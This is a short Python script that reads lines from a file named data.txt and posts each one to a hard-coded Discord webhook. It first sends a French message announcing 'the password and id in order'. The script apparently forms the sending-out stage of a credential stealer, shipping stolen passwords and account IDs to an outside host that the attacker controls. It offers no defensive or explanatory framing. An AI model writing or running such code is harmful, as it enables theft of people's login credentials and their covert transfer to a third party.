from discord import SyncWebhook

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1065002089295642725/0QuYwem4BHwH6G1im5H9pGzZjmzB7RFGoYxtR0_wzS2SaSXjafNC6fARZtFOOg5hmjCH")

with open('data.txt', 'r') as file:
    lines = file.readlines()
    webhook.send("voici le mdp et id dans l'ordre")
    for line in lines:
        # check if line is not empty
        
        if line.strip():
            # store each line in a variable
            my_variable = line
            # send a message using the webhook
            webhook.send(my_variable)

